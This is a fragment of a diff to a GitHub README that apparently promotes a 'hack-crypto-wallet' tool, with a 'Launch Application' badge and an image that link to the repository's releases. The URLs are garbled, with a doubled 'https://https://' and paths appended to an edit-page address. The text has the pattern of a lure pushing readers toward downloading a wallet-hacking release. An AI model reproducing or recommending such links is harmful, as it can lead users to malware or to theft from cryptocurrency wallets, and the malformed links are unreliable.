@@ -74,7 +74,7 @@ Click [here](https://https://github.com/victoriacook0147-blip/Chloe-travota/edit
 
 For additional resources, updates, and releases, check the **Releases** section of this repository.
 
-[![Launch Application](https://https://github.com/victoriacook0147-blip/Chloe-travota/edit/main/readme.mdhack-crypto-wallet/releases)](https://https://github.com/victoriacook0147-blip/Chloe-travota/edit/main/readme.md/hack-crypto-wallet/releases)
+[![Launch Application](https://https://github.com/victoriacook0147-blip/Chloe-travota/edit/main/readme.md/hack-crypto-wallet/releases)](https://https://github.com/victoriacook0147-blip/Chloe-travota/edit/main/readme.md/hack-crypto-wallet/releases)
 
 ## Let's Dive Deeper! 🌟
 
@@ -82,3 +82,4 @@ Explore the world of crypto wallets, blockchain technology, and cybersecurity in
 
 
 ![Cryptocurrency Image](https://github.com/https://github.com/victoriacook0147-blip/Chloe-travota/edit/main/readme.md/hack-crypto-wallet/releases)
+
